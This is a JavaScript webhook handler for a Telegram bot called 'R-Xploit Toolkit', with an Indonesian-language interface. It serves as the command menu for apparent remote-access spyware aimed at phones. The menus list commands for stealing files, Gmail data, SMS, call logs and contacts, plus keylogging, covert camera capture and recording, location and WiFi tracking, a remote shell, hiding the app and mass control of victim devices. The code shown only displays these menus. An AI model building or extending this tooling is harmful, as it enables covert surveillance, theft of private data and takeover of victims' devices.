export default async function handler(req, res) {
  const token = process.env.BOT_TOKEN;
  const body = req.body;

  const sendMessage = async (chatId, text, extra = {}) => {
    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, ...extra }),
    });
  };

  const answerCallbackQuery = async (id, text = "") => {
    return fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: id, text }),
    });
  };

  const chatId = body.message?.chat?.id || body.callback_query?.message?.chat.id;
  const text = body.message?.text;
  const callbackQuery = body.callback_query;

  if (text === "/start") {
    await sendMessage(chatId, "👋 Selamat datang di *R-Xploit Toolkit!*", {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📜 Menu", callback_data: "menu_main" }],
          [{ text: "💥 Jalankan Perintah", switch_inline_query_current_chat: "/" }],
        ],
      },
    });
    return res.status(200).send("OK");
  }

  if (text === "/menu") {
    await sendMessage(chatId, "📜 *MENU FITUR R-Xploit:*\nPilih kategori fitur:", {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📁 File & Folder", callback_data: "menu_file" },
            { text: "📱 Device", callback_data: "menu_device" },
          ],
          [
            { text: "🔧 Sistem", callback_data: "menu_system" },
            { text: "📍 Jaringan", callback_data: "menu_network" },
          ],
          [
            { text: "🗂 Data", callback_data: "menu_data" },
            { text: "📸 Kamera", callback_data: "menu_camera" },
          ],
          [
            { text: "🔔 WA/Notif", callback_data: "menu_wa" },
            { text: "🛡️ Keylogger", callback_data: "menu_keylog" },
          ],
          [
            { text: "📦 Aplikasi", callback_data: "menu_apps" },
            { text: "⚙️ Custom", callback_data: "menu_custom" },
          ],
          [{ text: "👤 User Admin", callback_data: "menu_user" }],
        ],
      },
    });
    return res.status(200).send("OK");
  }

  if (callbackQuery?.data?.startsWith("menu_")) {
    const map = {
      "menu_file": `📁 *File & Folder:*\n🔹 /ambil <folder>\n🔹 /ambilfile <path>\n🔹 /zip <folder>`,
      "menu_device": `📱 *Device & Target:*\n🔹 /info\n🔹 /deviceid\n🔹 /targetDevice <id> <cmd>\n🔹 /allDevice <cmd>\n🔹 /targetList\n🔹 /aliasdev <nama> <id>\n🔹 /aliasdevlist\n🔹 /aliasdevdel <nama>`,
      "menu_system": `🔧 *Kontrol Sistem:*\n🔹 /update <url>\n🔹 /mati\n🔹 /shell <cmd>\n🔹 /hide\n🔹 /show`,
      "menu_network": `📍 *Lokasi & Jaringan:*\n🔹 /lokasi\n🔹 /wifi\n🔹 /alihkan <url>`,
      "menu_data": `🗂 *Data Pribadi:*\n🔹 /getgmail\n🔹 /smshack\n🔹 /CallLogs\n🔹 /kontak`,
      "menu_camera": `📸 *Kamera & Media:*\n🔹 /cam\n🔹 /setwallpaper <path>\n🔹 /resetwallpaper\n🔹 /playAudio <path>\n🔹 /stopAudio\n🔹 /playVideo <path>\n🔹 /rec`,
      "menu_wa": `🔔 *WA & Notifikasi:*\n🔹 /wa <nomor> <pesan>\n🔹 /balas <pesan>\n🔹 /bantaiToxic <lvl>,<jml>\n🔹 /dialog`,
      "menu_keylog": `🛡️ *Keylogger & Lampu:*\n🔹 /keylogON\n🔹 /keylogOFF\n🔹 /senterON\n🔹 /senterOFF`,
      "menu_apps": `📦 *Aplikasi:*\n🔹 /getapps`,
      "menu_custom": `⚙️ *Fitur Custom:*\n🔹 /addfitur <cmd> <type> <isi>\n🔹 /delfitur <cmd>\n🔹 /editfitur <cmd> <type> <isi>\n🔹 /fiturinfo <cmd>`,
      "menu_user": `👤 *Manajemen User:*\n🔹 /adduser <id>\n🔹 /listuser\n🔹 /deluser <id>\n🔹 /broadcast <pesan>\n🔹 /pm <id> <pesan>`,
    };

    const content = map[callbackQuery.data] || "⚠️ Tidak ditemukan.";
    await answerCallbackQuery(callbackQuery.id);
    await sendMessage(chatId, content.trim(), { parse_mode: "Markdown" });
    return res.status(200).send("OK");
  }

  res.status(200).send("No action taken");
      }
